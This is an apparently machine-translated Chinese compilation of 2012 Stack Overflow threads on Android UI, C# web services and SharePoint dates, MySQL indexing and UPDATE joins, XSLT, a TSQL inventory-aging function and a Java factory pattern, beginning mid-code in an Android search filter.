                  {
                      textlength = inputSearch.getText().length();
                      String query = inputSearch.getText().toString();

                      arr_sort.clear();
                      for(int i=0;i < currentArray.size();i++)
                      {
                          if(textlength <= currentArray.get(i).getName().length())
                          {
                              String[] wordArray = currentArray.get(i).getName().split(" ");
                              for (int j = 0; j < wordArray.length; j++)
                              {
                                  if(query.equalsIgnoreCase((String) wordArray[j].subSequence(0, textlength)))
                                  {
                                      arr_sort.add(currentArray.get(i));
                                      break;
                                  }
                              }
                          }
                      }
                    list_adapter = new announcersListAdapter(MyListActivity.this, R.layout.tab_list_item, arr_sort);
                    setListAdapter(list_adapter);

                  }

                    public void beforeTextChanged(CharSequence arg0, int arg1, int arg2,
                            int arg3) {
                    }

                    public void afterTextChanged(Editable s) {
                    }
                }); 
```

感谢帮助我的家伙:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T16:05:28.893

如果你改变这条线，它会更好吗？

```
if(query.equalsIgnoreCase((String) wordArray[j].subSequence(0, textlength))) 
```

和

```
if(query.equalsIgnoreCase(wordArray[j].substring(0,
                          Math.min(wordArray[j].length(), textlength)))) 
```

?

# c# - 展示如何添加 Web 服务程序集

> ID：12427102
> 
> 赞同：-2
> 
> 时间：2012-09-14T15:02:01.350
> 
> 标签：c#, web-services, webservice-client

我是 C# 和 Web 服务的新手。

我无法使用 Web 服务为我提供的课程，有人可以帮助我或解释为什么它不能使用，因为我使用其他服务（在图像中标识）

[http://imageshack.us/photo/my-images/836/23770139.png/](http://imageshack.us/photo/my-images/836/23770139.png/)

[http://imageshack.us/a/img818/5301/67546759.png](http://imageshack.us/a/img818/5301/67546759.png)

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:04:47.773

在您的 c# 代码的顶部放置`using` webservice 的名称，就像您添加任何其他命名空间一样

前任。

```
using System.Data;
using System.Data.SqlClient;
using net.virtualearth.dev; 
```

我将 virtualearth 网络服务用于 Bing 的地理定位服务，这就是您将其包含在内的代码，

这是假设你已经在你的项目中添加了对它的引用，我认为你试图展示 的图片，但是你把所有东西都涂黑了

编辑：

将 web 服务添加到 c# 项目

右键单击项目 -> 添加服务引用

点击 Advanced 然后 Enter URL ，如果找到了 webservice 就会出现

单击添加参考

# android - 如何在android中设置按钮选择颜色和圆角？

> ID：12427107
> 
> 赞同：19
> 
> 时间：2012-09-14T15:02:22.933
> 
> 标签：android, background-color, rounded-corners, android-button

我想为android中的按钮设置一个圆角，并在选择时更改按钮颜色。我正在做以下事情。

可绘制/push_button.xml

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android" >    
    <item android:state_pressed="true"  android:drawable="@color/green"/>
    <item android:state_focused="true"  android:drawable="@color/green"/>
    <item android:state_focused="false"  android:drawable="@color/green"/>
    <item android:state_pressed="false" android:drawable="@color/red"/>
    <item  android:drawable="@drawable/push_button_background"/>         
</selector> 
```

可绘制/push_button_background.xml

```
<?xml version="1.0" encoding="utf-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android" 
    >
    <solid android:color="#3F4040"/>
    <corners 
    android:radius="7dp"
    />
</shape> 
```

在代码中，我正在使用

```
android:background="@drawable/push_button" 
```

在这里，问题是，选择和取消选择时按钮颜色设置正确。但是，圆角不起作用。

怎么做？如果我使用

```
android:background="@drawable/push_button_background" 
```

然后，圆角正在工作，但选择时的按钮颜色更改不起作用

如何实施？

我已经提到[了这个](https://stackoverflow.com/questions/5400852/round-cornered-button-with-background-color-in-android)链接。即使那样也没有帮助！

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-09-16T11:31:04.937

我通过几次尝试和错误尝试找到了我的问题的答案。

这是解决方案。

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android" >    

 <item android:state_pressed="true">
    <shape  >
    <solid android:color="@color/green"/>
    <corners 
    android:radius="7dp"/>
    </shape>
 </item>

 <item android:state_focused="true" >
    <shape xmlns:android="http://schemas.android.com/apk/res/android" >
    <solid android:color="@color/green"/>
    <corners 
    android:radius="7dp"/>
    </shape>
 </item>

 <item android:state_focused="false" >
    <shape xmlns:android="http://schemas.android.com/apk/res/android" >
    <solid android:color="@color/red"/>
    <corners 
    android:radius="7dp"/>
    </shape>   
 </item>

 <item android:state_pressed="false" >
    <shape xmlns:android="http://schemas.android.com/apk/res/android" >
    <solid android:color="@color/red"/>
    <corners 
    android:radius="7dp"
    />
    </shape>
 </item> 

</selector> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T15:49:06.280

我所做的是定义形状并指定每个角的 dp。

```
<shape xmlns:android="http://schemas.android.com/apk/res/android"
android:shape="rectangle" android:padding="90dp">
<solid android:color="#FFFFFF"/>
<padding />
<corners
    android:bottomRightRadius="15dp"
    android:bottomLeftRadius="15dp"
    android:topLeftRadius="15dp"
    android:topRightRadius="15dp"/>

</shape> 
```

如果你增加每个角落的 dp，它会使按钮更圆。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T16:41:57.773

我已经成功地做到了你所描述的。我做了以下事情：

首先，我创建了一个扩展 Button 的新类。在这个类中，我创建了一个名为 setState() 的方法：

```
public void setState (int s)
{
    if (s > 0 && s < 4 &&)
    {
        this.state = s;
        switch (state)
        {
            case 1:
                setBackgroundDrawable (def_gray);
                break;

            case 2:
                setBackgroundDrawable (lt_gray);
                break;

            case 3:
                setBackgroundDrawable (black);
        }
    }
} 
```

您在上面看到的三个背景可绘制对象是描述按钮外观的 XML 文件。它们大多相同，但每种颜色的设置有所不同。默认的灰色按钮描述如下：

```
<?xml version="1.0" encoding="utf-8"?>

<selector
    xmlns:android="http://schemas.android.com/apk/res/android">

    <item>

        <shape>

            <gradient
                android:startColor="#333333"
                android:endColor="#333333" />

            <stroke
                android:width="2dp"
                android:color="@android:color/white" />

            <corners
                android:radius="5dp" />

            <padding
                android:left="2dp"
                android:top="2dp"
                android:right="2dp"
                android:bottom="2dp" />

        </shape>

    </item>

</selector> 
```

据我所知，XML 格式有望用于在按钮面上配置颜色渐变。因为这不是我想要的，所以我将两个颜色值设置为相同并且背景颜色是一致的。您可能需要对颜色值进行一些试验，但看起来您已经掌握了这一点。

# mysql - 全文索引和复合索引以及它们如何影响查询

> ID：12427110
> 
> 赞同：3
> 
> 时间：2012-09-14T15:02:48.783
> 
> 标签：mysql, indexing, full-text-search

只是说我有一个查询如下..

```
SELECT 
    name,category,address,city,state
FROM
    table
WHERE 
    MATCH(name,subcategory,category,tag1) AGAINST('education')
AND 
    city='Oakland'
AND
    state='CA' 
LIMIT
    0, 10; 
```

..我有一个`fulltext`索引 as`name,subcategory,category,tag1`和一个`composite`索引 as `city,state`; 这对这个查询是否足够好？`AND`只是想知道在将全文索引与 MATCH/AGAINST混合使用时是否需要额外的东西。

**编辑：**我想了解的是，查询中但未在所选索引（全文索引）中编制索引的其他列会发生什么，上面的示例是`city`and `state`。MySQL 现在如何为这些找到匹配的行，因为它不能使用两个索引（或者可以吗？） - 所以，基本上，我试图了解 MySQL 如何为不在所选列中的列找到*最佳*数据全文索引以及我可以或*应该*做些什么来优化查询。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-21T03:37:02.333

如果我理解您的问题，您就知道 MATCH AGAINST 使用您的 FULLTEXT 索引，并且您想知道 MySQL 如何应用 WHERE 子句的其余部分（即它是执行表扫描还是索引查找）。

这是我对您的表的假设：它在某些 id 列和 FULLTEXT 索引上有一个 PRIMARY KEY。

所以首先，MySQL**永远不会**为城市/州 WHERE 子句使用 FULLTEXT 索引。为什么？因为 FULLTEXT 索引仅适用于 MATCH AGAINST。请参见第一组项目符号后面[的](http://dev.mysql.com/doc/refman/5.0/en/fulltext-search.html)段落（不是目录项目符号）。

**编辑：**在您的情况下，假设您的表不仅有 10 行，MySQL 将为您的 MATCH AGAINST 应用 FULLTEXT 索引，然后对这些结果进行表扫描以应用城市/州 WHERE。

那么，如果您将 BTREE 索引添加到城市和州呢？

```
CREATE INDEX city__state ON table (city(10),state(2)) USING BTREE; 
```

那么 MySQL 只能为这个查询使用**一个**索引，因为它是一个简单的选择。它将**使用**FULLTEXT**或**BTREE。请注意，当我说一个索引时，我的意思是一个索引定义，而不是多部分索引中的一列。Anwway，这就引出了一个问题，它使用的是哪一个*？*

这取决于表格分析。MySQL 将尝试*估计*（基于上一个 OPTIMIZE TABLE 的表统计信息）哪个索引将修剪最多的记录。*如果城市/州 WHERE 将您减少到 10 条记录，而 MATCH AGAINST 仅将您减少到 100，则 MySQL 将首先*使用 city__state 索引来查找城市/州 WHERE，然后为 MATCH AGAINST 执行表扫描。

另一方面，如果 MATCH_AGAINST 让你减少到 10 条记录，而城市/州 WHERE 让你只剩下 1000 条，那么 MySQL 将首先应用 FULLTEXT 索引，然后对城市和州应用表扫描。

底线是索引的*基数*。本质上，将进入您的索引的值有多独特？如果您表中的每条记录都将 city 设置为 Oakland，那么它不是一个非常独特的键，因此**city = 'Oakland'**并不会真正减少您的记录数量。在这种情况下，我们说您的 city__state 索引具有*低基数*。

因此，如果您的 FULLTEXT 索引中 90% 的单词是“John”，那么出于完全相同的原因，这也对您没有太大帮助。

如果你能负担得起空间和 UPDATE/DELETE/INSERT 开销，我建议添加 BTREE 索引并让 MySQL 决定他想使用哪个索引。根据我的经验，他通常会很好地挑选合适的人。

我希望这能回答你的问题。

**编辑：**附带说明，确保为 BTREE 索引选择正确的大小（在我的示例中，我选择了 city 中的前 10 个字符）。这显然会对基数产生巨大影响。如果您选择城市（1），那么显然您将获得比城市（10）更低的基数。

**EDIT2：** MySQL 的查询计划（估计）哪个索引修剪最多记录是您在 EXPLAIN 中看到的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T22:41:49.717

`EXPLAIN`我认为您可以通过在查询中使用来轻松确定使用哪个索引。请检查[这个问题](https://stackoverflow.com/questions/3581949/expain-the-result-of-explain-query-in-mysql)的已接受答案，它提供了一些关于如何解释`EXPLAIN`.

> MySQL 现在如何为这些找到匹配的行，因为它不能使用两个索引

是的，它可以：[MySQL 可以为单个查询使用多个索引吗？](https://stackoverflow.com/questions/12222630/can-mysql-use-multiple-indexes-for-a-single-query)此外，您应该阅读文档：[MySQL 如何使用索引](http://dev.mysql.com/doc/refman/5.0/en/mysql-indexes.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-20T08:27:18.933

前段时间我有类似的任务，我注意到 MySQL 可以在一个查询中使用 FULLTEXT 索引或任何其他索引/索引，但不能同时使用两者；我无法将 FULLTEXT 与任何其他索引混合。任何带有全文搜索的选择都将以这种方式工作：

*   使用 FULLTEXT 搜索选择子集
*   从该子集中选择与其他条件匹配的记录“使用位置”

因此，您可以使用全文索引或任何其他索引（我无法通过 FORCE INDEX 或其他任何方式使用这两个索引）。

我建议尝试使用全文和使用其他索引（即在 City 和 State 列上）并比较结果 - 它们可能会因数据库中的实际内容而异。

就我而言，我发现在此类查询中强制使用常规（非全文）索引会产生更好的性能（因为我有非常多的行，大约 300 000 行，并且非全文条件匹配其中大约 1000 个）。

我使用的是 MySQL 5.5.24

# mysql - 更新了 MySQL 查询中的连接不起作用

> ID：12427114
> 
> 赞同：0
> 
> 时间：2012-09-14T15:03:11.593
> 
> 标签：mysql, database

我已经使用以前问题的答案尝试了此更新查询的许多版本，但似乎无法使其正常工作。我最近的一个返回 0 行受影响。

运行此查询时，我得到 2017 年的结果（这是我想要的）

```
SELECT *
FROM  table_1 t1
INNER JOIN table_2 t2 ON t1.company = t2.company
WHERE t1.user = 123 AND t2.group_id = 3 
```

但我想运行这样的更新查询

```
UPDATE table_1 AS t1
INNER JOIN table_2 as t2
ON t1.company = t2.company
SET t1.user = t2.user
WHERE t1.user = 123 AND t2.group_id = 3 
```

但我受到 0 行影响

为什么此更新查询不更新查询 1 中返回的 2017 年记录？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:09:03.853

我希望您的选择查询返回太多行，因为您有一个错误：

```
INNER JOIN table_2 t2 ON t2.company = t2.company 
```

我想你想要：

```
INNER JOIN table_2 t2 ON t1.company = t2.company 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:12:53.050

在运行更新查询之前，您确定 table_1.user 和 table_2.user 值实际上*不同吗？*MySQL 将报告实际更改的行数，而不是选择和检查的行数。

首先尝试运行此查询，以查看 2017 年有多少行实际需要更新：

```
SELECT *
FROM  table_1 t1
INNER JOIN table_2 t2 ON t1.company = t2.company
WHERE t1.user = 123 AND t2.group_id = 3
AND t1.user <> t2.user 
```

## 更新

事实证明，如果数据类型足够相似以进行比较，但不足以将 table_2.user 中的值分配给 table_1.user 时，就会发生这种情况。在这种情况下，MySQL 将发出警告（“超出第 xxx 行的“用户”列调整的值范围”），否则将允许查询成功。再次运行查询将显示值仍然不同，但不会更改实际存储在 t1.user 中的内容。

如果您修改更新查询以仅匹配需要更改的行，并从命令行运行它，那么 MySQL 将准确地告诉您发生了什么：

```
mysql> UPDATE table_1 AS t1
    -> INNER JOIN table_2 as t2
    -> ON t1.company = t2.company
    -> SET t1.user = t2.user
    -> WHERE t1.user = 123 AND t2.group_id = 3
    -> AND t1.user <> t2.user
Query OK, 0 rows affected, 2017 warnings (0.01 sec)
Rows matched: 2017  Changed: 0  Warnings: 2017 
```

`Rows matched: 2017`表示有 2017 行需要更新（如果值已经正确，则为 0）

`Changed: 0``SET t1.user = t2.user`意味着尽管有命令，但它们实际上都没有最终得到不同的值。

`Warnings: 2017`说出现了问题，您应该发出`SHOW WARNINGS`查询以找出问题所在。在这种情况下，可以存储在 smallint 和整数中的内容之间的差异意味着数据在 table_1 中被截断。

# c# - 从另一个进程访问 .NET 控件

> ID：12427115
> 
> 赞同：0
> 
> 时间：2012-09-14T15:03:26.163
> 
> 标签：c#, .net, process, controls

我希望创建一个从另一个 Windows 窗体复制一些数据的窗体。换句话说，我想将控件复制到我的表单中。这两种形式在不同的进程上运行。我的问题是，这可以通过获取源表单的句柄来完成吗？我已经尝试使用这种方法一段时间了，并且还进行了一些研究，因为我是处理流程的新手，但我无法实现我正在寻找的结果。有些人还建议 DLL 注入，由于网络上没有好的教程，我已经尝试过但没有成功。

只是我认为重要的几点。

1.  两种形式都是用 C# 编码的
2.  我设法使用外部程序获取源的属性（不确定这是否有帮助）

如果有人有一个很好的指南或者可以给我一些关于我应该使用什么的想法，那就太好了。

感谢您花时间阅读这篇文章。

# xslt - 输入包含需要删除的段落字符

> ID：12427117
> 
> 赞同：0
> 
> 时间：2012-09-14T15:03:35.073
> 
> 标签：xslt, xslt-1.0

我一直在尝试从 xsl 中修改父元素的文本。我怎样才能删除

XSL 代码中的元素（我不控制输入）。我只想删除前面的换行符，而不是正文中的所有换行符。前面的“这里有一些文字”可能采用多个段落的形式。

**Xsl**

```
<xsl:template match="element">
  <!-- attempting to add fix here -->

  <xsl:apply-templates />
</xsl:template> 
```

**输入**

```
<body>
  <p>
    some text here
  </p>
  <element>
    some more text
  </element>
</body> 
```

**输出**

```
some text here
some more text 
```

**期望的输出**

```
some text here some more text 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:04:38.070

做

```
<xsl:template match="p[following-sibling::*[1][self::element]]//text() | element[preceding-sibling::*[1][self::p]//text()">
  <xsl:value-of select="normalize-space()"/>
</xsl:template> 
```

做你想做的事？

您不需要，`<xsl:template match="element"><xsl:apply-templates/></xsl:template>`因为内置模板无论如何都会这样做。

我找到了一些时间来测试代码，现在我有了

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:output method="text"/>

<xsl:template match="p[following-sibling::*[1][self::element]]//text() |
  element[preceding-sibling::*[1][self::p]]//text()">
  <xsl:value-of select="normalize-space()"/>
</xsl:template>

<xsl:template match="text()[preceding-sibling::*[1][self::p] and following-sibling::*[1][self::element] and not(normalize-space())]">
  <xsl:text> </xsl:text>
</xsl:template>

</xsl:stylesheet> 
```

变换

```
<body>
  <p>
    some text here
  </p>
  <element>
    some more text
  </element>
</body> 
```

进入

```
 some text here some more text 
```

# c# - 从 SharePoint 列表中检索的日期是未来 4 小时

> ID：12427118
> 
> 赞同：0
> 
> 时间：2012-09-14T15:03:35.570
> 
> 标签：c#, sharepoint

奇怪的虫子，

插入 SharePoint 列表项时，我将提交的日期设置为 DateTime.Now，它工作正常，因为当我检查 SharePoint 时，我看到插入的项目很好，日期和所有值都正确。

```
oListItem["Date_x0020_Submitted"] = DateTime.Now; 
```

但是当我出于某种原因去检索完全相同的列表项时，日期会在未来 4 小时后返回！

```
 query.ViewXml = "<View><Query><OrderBy><FieldRef Name='Date_x0020_Submitted' Ascending='FALSE' /></OrderBy></Query><RowLimit>1</RowLimit></View>";
    SP.ListItemCollection issuesCollection = oList.GetItems(query);
    MyContext.Load(issuesCollection, (items => items.Include(item => item["ID"], item => item["Date_x0020_Submitted"]))); 
```

重申一下，插入项目后，我可以在列表中看到它并插入了正确的确切日期，但是当我出于某种原因检索它时，它是未来 4 小时。例如，在 SharePoint 中，它向我显示 10:53，但当我检索它时，它显示为 2:53。

有谁知道为什么会发生这种情况？它发生在我插入和检索的每一个项目上。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:29:08.380

您存储的时间是您的本地时间（UTC-5:00，可能使用 DST）。Sharepoint 返回的时间是否有可能返回为 UTC 时间？`Kind`类的属性`DateTime`告诉它是什么时间（这已经通过不同版本的 .NET 框架发生了变化）：

```
var kind = DateTime.Now.Kind; 
```

您可以将返回的时间转换为本地时间，看看是否匹配：

```
var localTime = utcTime.ToLocalTime(); 
```

正如您所说，您的时间是以字符串形式给出的（尽管我怀疑这种格式看起来不像字符串），您可以尝试解析它：

```
 string fmt = "M/d/yyyy h:mm:ss tt"; // this is equivalent to format you have shown
  string stime = "9/14/2012 3:38:04 PM"; // your string here
  var time = DateTime.ParseExact(time, fmt, CultureInfo.InvariantCulture);
  var local = time.ToLocalTime(); // => 14.9.2012\. 17:38:04 in my timezone 
```

# android - 水平滚动视图滚动更改选项卡焦点

> ID：12427120
> 
> 赞同：0
> 
> 时间：2012-09-14T15:03:41.987
> 
> 标签：android, android-tabhost, tabwidget, horizontalscrollview

我在水平滚动视图中有一个标签小部件。我遇到的问题是，当我在滚动视图中滚动时，选项卡小部件中的当前选项卡会发生变化，并且由于执行了这个 ontabchange 事件处理程序。

为了阻止这种情况，我试图处理滚动视图的 ontouchevent，它滚动标签并返回 true。但不太能够正确地做到这一点。

有人可以帮忙吗？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-20T11:22:46.863

在标签 xml 中试试这个

```
<HorizontalScrollView
    android:layout_width="fill_parent"
    android:layout_height="200dp">

    <LinearLayout
        android:layout_width="wrap_content"
        android:layout_height="200dp"
        android:orientation="horizontal">

        <ImageView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:src="@drawable/src" />

    </LinearLayout>
</HorizontalScrollView> 
```

# sql - 需要帮助优化 TSQL 表值函数

> ID：12427121
> 
> 赞同：0
> 
> 时间：2012-09-14T15:03:46.077
> 
> 标签：sql, sql-server, sql-server-2008, tsql, table-valued-parameters

这是功能：

```
CREATE FUNCTION dbo.agedItemResult(@ILC VARCHAR(30))
    RETURNS @AgedTable TABLE (
ItemID INT,
ItemLookupCode VARCHAR(30),
[Month] INT,
[Year] INT,
Aged INT,
Debug01 VARCHAR(MAX),
Debug02 VARCHAR(MAX),
Debug03 VARCHAR(MAX),
Debug04 VARCHAR(MAX),
Debug05 VARCHAR(MAX)
) 
AS
BEGIN

DECLARE @TotalSold INT
DECLARE @AdjustmentQty INT
DECLARE @FirstRcvdStart DATETIME
DECLARE @FirstRcvdEnd DATETIME
--DECLARE @ILC VARCHAR(MAX)
--DECLARE @ItemID INT
DECLARE @MovingQty INT
DECLARE @MovingMonthStart DATETIME
DECLARE @MovingMonthEnd DATETIME
DECLARE @CurrentMonthStart DATETIME
DECLARE @CurrentMonthEnd DATETIME
DECLARE @CurrentRcvd INT
DECLARE @NumMonths INT
DECLARE @AgeReached INT
/*DECLARE @AgedTable TABLE (    ItemID INT,
                            ItemLookupCode VARCHAR(MAX),
                            [Month] INT,
                            [Year] INT,
                            Aged INT,
                            Debug01 VARCHAR(MAX),
                            Debug02 VARCHAR(MAX),
                            Debug03 VARCHAR(MAX),
                            Debug04 VARCHAR(MAX),
                            Debug05 VARCHAR(MAX)
                            )*/

--SET @ILC = '21208641'
SET @TotalSold          = (SELECT SUM(Sold) FROM JSInventorySnapShot WHERE ItemLookupCode = @ILC)
SET @AdjustmentQty      = (SELECT SUM(HQAdjustment) FROM JSInventorySnapShot WHERE ItemLookupCode = @ILC)
SET @FirstRcvdStart     = (SELECT TOP 1 FirstTransferred FROM JSInventorySnapShot ORDER BY FirstTransferred ASC)
SET @FirstRcvdEnd       = (SELECT DATEADD(s,-1,DATEADD(mm, DATEDIFF(m,0, @FirstRcvdStart)+1,0)))
SET @CurrentMonthStart  = (SELECT DATEADD(s,0,DATEADD(mm, DATEDIFF(m,0, GETDATE()),0))) 
SET @CurrentMonthEnd    = (SELECT DATEADD(s,-1,DATEADD(mm, DATEDIFF(m,0, GETDATE())+1,0))) 
SET @NumMonths          = (SELECT CASE 
                            WHEN DATEPART(DAY, @FirstRcvdStart) > DATEPART(DAY, @CurrentMonthEnd) 
                                THEN DATEDIFF(MONTH, @FirstRcvdStart, @CurrentMonthEnd) - 1 
                                ELSE DATEDIFF(MONTH, @FirstRcvdStart, @CurrentMonthEnd) 
                            END) + 1
SET @MovingQty          = @TotalSold
SET @CurrentRcvd        = ISNULL((SELECT SUM(Rcvd) FROM JSInventorySnapShot WHERE ItemLookupCode = @ILC AND [Month] = Month(@FirstRcvdStart)), 0) + @AdjustmentQty
SET @MovingMonthStart   = @FirstRcvdStart
SET @MovingMonthEnd     = @FirstRcvdEnd
SET @MovingQty          = @MovingQty - @CurrentRcvd
SET @AgeReached         = 0

WHILE(@NumMonths > 0)
BEGIN
    IF (@CurrentRcvd = 0)
    BEGIN
        INSERT INTO @AgedTable (ItemID, ItemLookupCode, [Month], [Year], Aged, Debug01) 
            SELECT (SELECT TOP 1 ItemID FROM JSInventorySnapShot WHERE ItemLookupCode = @ILC),
                        @ILC, 
                        MONTH(@MovingMonthStart),
                        YEAR(@MovingMonthStart),
                        0,
                        @AdjustmentQty
    END
    ELSE
    BEGIN
        IF(@MovingQty > 0)
        BEGIN
            INSERT INTO @AgedTable (ItemID, ItemLookupCode, [Month], [Year], Aged, Debug01) 
                SELECT (SELECT TOP 1 ItemID FROM JSInventorySnapShot WHERE ItemLookupCode = @ILC),
                            @ILC, 
                            MONTH(@MovingMonthStart),
                            YEAR(@MovingMonthStart),
                            0,
                            @AdjustmentQty
        END
        ELSE
        BEGIN
            IF (@AgeReached = 1)
            BEGIN
                INSERT INTO @AgedTable (ItemID, ItemLookupCode, [Month], [Year], Aged) 
                    SELECT (SELECT TOP 1 ItemID FROM JSInventorySnapShot WHERE ItemLookupCode = @ILC),
                                @ILC, 
                                MONTH(@MovingMonthStart),
                                YEAR(@MovingMonthStart),
                                @CurrentRcvd
            END
            ELSE
            BEGIN
                INSERT INTO @AgedTable (ItemID, ItemLookupCode, [Month], [Year], Aged) 
                    SELECT (SELECT TOP 1 ItemID FROM JSInventorySnapShot WHERE ItemLookupCode = @ILC),
                                @ILC, 
                                MONTH(@MovingMonthStart),
                                YEAR(@MovingMonthStart),
                                (-1 * @MovingQty)
                    SET @AgeReached = 1
            END
        END
    END
    SET @NumMonths          = @NumMonths - 1
    SET @MovingMonthStart   = (SELECT DATEADD(s,0,DATEADD(mm, DATEDIFF(m,0, @MovingMonthStart)+1,0))) 
    SET @MovingMonthEnd     = (SELECT DATEADD(s,-1,DATEADD(mm, DATEDIFF(m,0, @MovingMonthEnd)+2,0)))
    SET @CurrentRcvd        = ISNULL((SELECT SUM(Rcvd) FROM JSInventorySnapShot WHERE ItemLookupCode = @ILC AND [Month] = Month(@MovingMonthStart)), 0)
    SET @MovingQty          = @MovingQty - @CurrentRcvd
    END
    RETURN
END 
```

简而言之，这就是它的作用：

首先，我们找到第一个收到或移动的物品，并使用日期作为开始日期。然后我们找到该商品的总销售额，并开始从销售额中减去收货金额。剩余部分被视为老化（未售出），并在下个月进行评估。然后我们移至下个月并重复该过程，直到我们达到负数或 0。如果我们达到负数，则意味着我们已经达到了一个月，我们订购的数量超过了迄今为止的销售量，并且该数量被视为已老化（不出售）。如果还有更多月份需要评估，则默认情况下，任何进一步收到的金额都将被视为已过期，因为它显然未售出。

以下是用于评估的表中的示例数据：

```
ID      ItemID  ItemLookupCode  HQAdjustment    FirstTransferred        Rcvd    RcvdDateEarly           RcvdDateLate            Sold    SoldDateEarly           SoldDateLate            Sales   Month   Year    StartOfMonthQty EndOfMonthQty
17350   188993  21208641        0               2012-04-05 13:29:14.000 48      2012-04-27 11:00:40.100 2012-04-27 11:00:40.100 40      2012-04-05 13:29:14.000 2012-04-30 12:50:13.000 75.20   4       2012    0               8
34427   188993  21208641        0               2012-04-05 13:29:14.000 120     2012-05-22 10:14:40.213 2012-05-22 10:14:40.213 24      2012-05-04 17:42:12.000 2012-05-29 10:22:10.000 44.72   5       2012    8               104
48437   188993  21208641        0               2012-04-05 13:29:14.000 0       NULL                    NULL                    12      2012-06-02 16:24:45.000 2012-06-21 11:15:05.000 22.36   6       2012    104             92
62369   188993  21208641        0               2012-04-05 13:29:14.000 60      2012-07-16 12:57:33.330 2012-07-16 12:57:33.330 9       2012-07-11 14:42:01.000 2012-07-25 14:58:41.000 16.22   7       2012    92              143
75781   188993  21208641        0               2012-04-05 13:29:14.000 0       NULL                    NULL                    2       2012-08-01 12:56:10.000 2012-08-14 19:01:00.000 4.01    8       2012    143             141 
```

这是我对上述数据的函数的结果：

```
ItemLookupCode  Month   Rcvd    Sold    Aged
21208641        4       48      40      0
21208641        5       120     24      81
21208641        6       0       12      0
21208641        7       60      9       60
21208641        8       0       2       0 
```

这告诉我，我们卖掉了四月份收到的所有东西。5 月再次订购，卖出了一些，但仍有剩余库存（老化）。然后，在 7 月份没有售出库存的情况下，我们再次订购了更多库存，因此该库存被自动视为已老化。

这个函数的目的是停止上面发生的事情。这是订购具有老化（未售出）库存的物品。它还用于评估一个部门的老化程度，以及我们是否应该考虑开始销售以摆脱老化的物品。

问题是我们要评估的项目不少于 40,000 个。此功能适用于单个项目，但 100 个项目需要 30 秒。我希望有人能长期来看我的功能并意识到我正在以完全错误的方式进行操作。如果我可以完成内联计算并结转剩余部分，那就太好了。

我基本上需要简化的伪代码：

```
Foreach (Month2Date)
If AllInventoryAged = 1 Then //This says we've reached our sales:rcved thresh-hold and all received inventory is aged from here on out.
   ThisMonthAged = RcvedForMonth
Else
   TotalSales - RcvedForMonth = Aged
    If Aged < 0 Then
        ThisMonthAged = Aged * -1 //We received more than sold so it's negative and we have hit our sales:rcved thresh-hold.
        AllInventoryAged = 1 //Anything received from this point on is aged.
    Else    
        ThisMonthAged = 0  //We received less this month then sold. A good thing.
        TotalSales = Aged //We carry on the remainder for further evaluation 
```

我希望这次我已经彻底解释了自己。抱歉这么久。我真的很想涵盖我在上一篇文章中遇到的所有问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T13:56:07.913

我最终通过重新评估我想要做的事情来解决这个问题。我能够使用递归 CTE。你可以在这里看到我相关的“测试”代码：

[TSQL - 递归 CTE 效率低下 - 需要替代方案](https://stackoverflow.com/questions/12827236/tsql-recursive-cte-inefficient-need-an-alternative)

# java - 在不调用所需初始化方法的情况下防止子类实例化的正确方法？

> ID：12427131
> 
> 赞同：3
> 
> 时间：2012-09-14T15:04:03.760
> 
> 标签：java, design-patterns, inheritance, overriding, factory

有人可以帮助新手程序员了解他的解决方案是否正确吗？

我的问题类似于以下两个：

[构造函数中可覆盖的方法调用有什么问题？](https://stackoverflow.com/questions/3404301/whats-wrong-with-overridable-method-calls-in-constructors)

[C#中的工厂模式：如何确保对象实例只能由工厂类创建？](https://stackoverflow.com/questions/515269/factory-pattern-in-c-how-to-ensure-an-object-instance-can-only-be-created-by-a)

**问题：**我想拥有仅在初始化方法上有所不同的子类。但是，我还想防止在没有初始化的情况下实例化这些类。换句话说，我想确保在子类实例化之后**总是**会调用一些“initialize()”方法：

```
public abstract class Data {

 protected Parameter dataSource;     

  Data(parameter1){
     this.dataSource = parameter1;

  loadData(); // should be called to initialise class fields and ensure correct work of other class methods
  }

 protected abstract loadData(){
     ... //uses dataSource
 }
} 
```

所以我决定在构造函数上执行初始化。它有效（现在我知道这是一个非常**糟糕的做法**），直到我创建了一个子类，其中初始化方法使用了一些额外的参数：

```
public class DataFromSpecificSources extends Data {

 private Parameter dataSource2;

 public DataFromSpecificSources(parameter1, parameter2){
    this.dataSource2 = parameter2; // I can't put it here because the constructor is not called yet
    super(parameter1); // this, of course, will not work
  }

 @Override
 private void loadData(){
   ... // uses both dataSource 1 and 2
       // or just dataSource2
  }
} 
```

当然，这是行不通的。然后我开始寻找正确的模式......在阅读了之前发布的问题的答案后，我决定使用工厂并将子类构造函数的可见性限制在包中：

**我的解决方案：**

```
// factory ensures that loadData() method will be called
public class MyDataFactory(){

 public Data createSubClass(parameter1,parameter2){
  Data subClass;

  if (parameter2 != null){
   subClass = new DataFromSpecificSources(parameter1, parameter2);
   subClass.loadData();
  } else {
   subClass = new AnotherSubClass(parameter1);
   subClass.loadData()
  }

  return subClass;
 }

}

 public abstract class Data {

 protected Parameter dataSource;     

  Data(parameter1){
     this.dataSource = parameter1;
  }

 // I don't call it in constructor anymore - instead it's controlled within the factory
 protected abstract loadData(){
     ... //uses dataSource
 }
}

